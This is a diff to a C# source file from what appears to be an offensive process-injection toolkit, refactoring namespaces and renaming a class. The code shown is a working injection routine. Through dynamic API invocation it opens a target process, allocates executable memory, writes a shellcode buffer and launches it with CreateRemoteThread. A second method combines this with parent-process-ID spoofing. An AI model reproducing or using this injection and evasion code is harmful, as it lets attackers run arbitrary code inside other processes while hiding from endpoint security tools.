@@ -1,11 +1,13 @@
 ﻿using System;
 using System.Runtime.InteropServices;
-using ProcessInjection.DInvoke.Native;
 using static ProcessInjection.Utils.Utils;
+using static ProcessInjection.Native.Enum;
+using static ProcessInjection.Native.Structs;
+using static ProcessInjection.Native.Delegates;
 
 namespace ProcessInjection.DInvoke
 {
-    public class CreateRemoteThread
+    public class DInvokeCreateRemoteThread
     {
         #region DynamicInvoke
         public static void DynamicCodeInject(int pid, byte[] buf)
@@ -20,15 +22,15 @@ namespace ProcessInjection.DInvoke
             {
                 PrintInfo($"[+] Obtaining the handle for the process id {pid}.");
                 var funcParams = new object[] {
-                    (uint)DInvoke.Native.Enum.ProcessAccessRights.All,
+                    (uint)ProcessAccessRights.All,
                     false,
                     (uint)pid
                 };
 
-                var pHandle = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                var pHandle = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "OpenProcess",
-                    typeof(DInvoke.Native.Delegates.OpenProcess),
+                    typeof(OpenProcess),
                     ref funcParams,
                     true);
 
@@ -41,13 +43,13 @@ namespace ProcessInjection.DInvoke
                     pHandle,
                     IntPtr.Zero,
                     (uint)buf.Length,
-                    (uint)DInvoke.Native.Enum.MemAllocation.MEM_RESERVE | (uint)DInvoke.Native.Enum.MemAllocation.MEM_COMMIT, (uint)DInvoke.Native.Enum.MemProtect.PAGE_EXECUTE_READWRITE
+                    (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE
                 };
 
-                var rMemAddress = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                var rMemAddress = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "VirtualAllocEx",
-                    typeof(DInvoke.Native.Delegates.VirtualAllocEx),
+                    typeof(VirtualAllocEx),
                     ref funcParams,
                     true);
 
@@ -63,10 +65,10 @@ namespace ProcessInjection.DInvoke
                     lpNumberOfBytesWritten
                 };
 
-                var status = (bool)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                var status = (bool)DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "WriteProcessMemory",
-                    typeof(DInvoke.Native.Delegates.WriteProcessMemory),
+                    typeof(WriteProcessMemory),
                     ref funcParams,
                     true);
 
@@ -85,10 +87,10 @@ namespace ProcessInjection.DInvoke
                     (uint)lpThreadId
                     };
 
-                    var hRemoteThread = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                    var hRemoteThread = (IntPtr)DynamicInvoke.DynamicApiInvoke(
                         "kernel32.dll",
                         "CreateRemoteThread",
-                        typeof(DInvoke.Native.Delegates.CreateRemoteThread),
+                        typeof(CreateRemoteThread),
                         ref funcParams,
                         true);
 
@@ -103,10 +105,10 @@ namespace ProcessInjection.DInvoke
                     pHandle
                     };
 
-                var closed = DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
+                var closed = DynamicInvoke.DynamicApiInvoke(
                     "kernel32.dll",
                     "CloseHandle",
-                    typeof(DInvoke.Native.Delegates.CloseHandle),
+                    typeof(CloseHandle),
                     ref funcParams,
                     true);
 
@@ -122,7 +124,7 @@ namespace ProcessInjection.DInvoke
         public static void PPIDDynCodeInject(string binary, byte[] shellcode, int parentpid)
         {
             DynamicPPIDSpoofing Parent = new DynamicPPIDSpoofing();
-            Structs.PROCESS_INFORMATION pinf = Parent.DynamicParentSpoofing(parentpid, binary);
+            PROCESS_INFORMATION pinf = Parent.DynamicParentSpoofing(parentpid, binary);
             DynamicCodeInject(pinf.dwProcessId, shellcode);
 
 
